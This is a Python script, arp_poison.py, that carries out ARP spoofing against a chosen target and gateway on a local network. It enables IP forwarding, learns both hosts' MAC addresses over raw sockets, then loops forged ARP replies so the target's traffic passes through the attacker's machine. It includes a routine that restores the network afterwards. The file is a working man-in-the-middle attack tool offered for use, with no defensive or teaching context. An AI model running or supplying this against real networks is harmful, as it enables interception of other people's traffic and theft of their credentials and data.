import os
import signal
import sys
import threading
import time
import socket
import binascii
import fcntl
import netifaces as ni
import struct
import argparse


# Get cli arguments
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Specify target ip")
    parser.add_argument("-g", "--gateway", help="Specify spoof ip")
    return parser.parse_args()


arguments = get_arguments()


# Get hosts's MAC
def get_local_mac(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(ifname, 'utf-8')[:15]))
    return ':'.join('%02x' % b for b in info[18:24])


gateway_ip_str = arguments.gateway
target_ip_str = arguments.target
local_ip_str = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
packet_count = 1000
local_ip = socket.inet_aton(local_ip_str)
local_mac = binascii.unhexlify(get_local_mac('eth0').replace(':', ''))


# Transform binary MAC in human-readable form
def format_mac(mac):
    mac = binascii.hexlify(mac).decode('utf-8')
    return ':'.join([mac[i:i+2] for i in range(0, len(mac), 2)])


# Get MAC of a local device by their IP
def get_target_mac(dest_ip):
    rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))

    # Broadcast ARP request
    broadcast_address = binascii.unhexlify("ffffffffffff")
    send_arp_packet(1, dest_ip, broadcast_address, local_ip, local_mac)

    while True:
        packet = rawSocket.recvfrom(65535)

        ethernet_header = packet[0][0:14]
        ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header)

        arp_header = packet[0][14:42]
        arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)

        # skip non-ARP packets
        ethertype = ethernet_detailed[2]
        if ethertype != b'\x08\x06':
            continue

        # Get MAC of the requested IP
        if arp_detailed[6] == dest_ip:
            return arp_detailed[5]


# Send an ARP packet
def send_arp_packet(op, dest_ip, dest_mac, sender_ip, sender_mac, count=1):
    for i in range(count):
        raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
        raw.bind(('eth0', socket.htons(0x0800)))

        # Ethernet Header
        protocol = 0x0806  # 0x0806 protocol to ARP
        ethernet_header = struct.pack("!6s6sH", dest_mac, sender_mac, protocol)

        # ARP header

        htype = 1  # Ethernet
        ptype = 0x0800  # IPV4
        hlen = 6  # Hardware address
        plen = 4  # Protocol address
        op = op  # 1 request / 2 reply

        arp_addr = struct.pack("!HHBBH6s4s6s4s", htype, ptype,
                               hlen, plen, op,
                               sender_mac, sender_ip, dest_mac, dest_ip)

        packet = ethernet_header + arp_addr

        print("%s is at %s" % (socket.inet_ntoa(target_ip), format_mac(local_mac)))
        raw.send(packet)


# Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
# correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    # Broadcast ARP request
    broadcast_address = binascii.unhexlify("ffffffffffff")

    # Send correct IP and MAC of target to the gateway
    send_arp_packet(op=2, dest_ip=gateway_ip, dest_mac=broadcast_address, sender_ip=target_ip, sender_mac=target_mac, count=5)

    # Send correct IP and MAC of gateway to the target
    send_arp_packet(op=2, dest_ip=target_ip, dest_mac=broadcast_address, sender_ip=gateway_ip, sender_mac=gateway_mac, count=5)

    print("[*] Disabling IP Forwarding")
    os.system("sysctl -w net.ipv4.ip_forward=0")

    # Kill process
    os.kill(os.getpid(), signal.SIGTERM)


# Starts the arp spoof attack
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            # Send spoofed address to the gateway
            send_arp_packet(2, gateway_ip, gateway_mac, target_ip, local_mac)

            # Send spoofed address to the target
            send_arp_packet(2, target_ip, target_mac, gateway_ip, local_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


# Start the script
print("[*] Starting script: arp_poison.py")
print(f"[*] Local IP address: {local_ip_str}")
print(f"[*] Gateway IP address: {gateway_ip_str}")
print(f"[*] Target IP address: {target_ip_str} \n")

# Enable IP Forwarding on ubuntu
os.system("sysctl -w net.ipv4.ip_forward=1")


gateway_ip = socket.inet_aton(gateway_ip_str)
target_ip = socket.inet_aton(target_ip_str)


gateway_mac = get_target_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)


target_mac = get_target_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)


print(f"[*] Local MAC address: {get_local_mac('eth0')}")
print(f"[*] Gateway MAC address: {format_mac(gateway_mac)}")
print(f"[*] Target MAC address: {format_mac(target_mac)} \n")


# ARP poison thread
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()
